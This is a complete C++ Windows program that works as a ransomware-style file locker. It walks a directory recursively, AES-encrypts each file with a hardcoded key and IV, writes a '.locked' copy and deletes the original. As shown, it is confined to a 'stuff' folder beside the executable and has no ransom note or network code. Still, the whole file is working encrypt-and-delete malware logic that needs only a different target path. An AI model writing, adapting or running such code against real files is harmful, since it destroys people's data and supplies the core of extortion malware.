#include <iostream>
#include <fstream>
#include <cstring>
#include <windows.h>

#include "cryptopp/modes.h"
#include "cryptopp/aes.h"

using namespace std;
using CryptoPP::AES;
using CryptoPP::CFB_Mode;
typedef unsigned char byte;

void encrypt_file(const char *path){
    ifstream in(path, ios::in | ios::binary | ios::ate);
    if(!in) return;

    size_t size = (size_t)in.tellg();
    in.seekg(0, ios::beg);
    if(size <= 0){ in.close(); return; }

    byte* plain = new byte[size];
    in.read(reinterpret_cast<char*>(plain), size);
    in.close();

    byte key[AES::DEFAULT_KEYLENGTH] = { '9','1','8','2','7','3','6','4','5' };
    byte iv[AES::BLOCKSIZE] = { '9','1','8','2','7','3','6','4','5' };

    byte* cipher = new byte[size];
    CFB_Mode<AES>::Encryption enc(key, AES::DEFAULT_KEYLENGTH, iv);
    enc.ProcessData(cipher, plain, size);

    string out_path = string(path) + ".locked";
    ofstream out(out_path, ios::out | ios::binary | ios::trunc);
    if(out){
        out.write(reinterpret_cast<char*>(cipher), size);
        out.close();
    }

    DeleteFileA(path);

    delete[] plain;
    delete[] cipher;
}

void walk(const char *dir){
    WIN32_FIND_DATAA findData;
    char search[MAX_PATH];
    snprintf(search, MAX_PATH, "%s\\*", dir);

    HANDLE hFind = FindFirstFileA(search, &findData);
    if(hFind == INVALID_HANDLE_VALUE) return;

    do {
        if(strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
            continue;

        if(strstr(findData.cFileName, ".locked")) continue;

        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", dir, findData.cFileName);

        if(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            walk(full);
        else
            encrypt_file(full);
    } while(FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

int main(){
    char stuff[MAX_PATH];
    GetModuleFileNameA(NULL, stuff, MAX_PATH);
    char *p = strrchr(stuff, '\\');
    if(p) *p = '\0';
    strcat(stuff, "\\stuff");

    DWORD attr = GetFileAttributesA(stuff);
    if(attr == INVALID_FILE_ATTRIBUTES){
        CreateDirectoryA(stuff, NULL);
        cout << "Created 'stuff' folder. Place files there and run again." << endl;
        return 0;
    }

    cout << "Locking: " << stuff << endl;
    walk(stuff);
    cout << "Done." << endl;
    return 0;
}
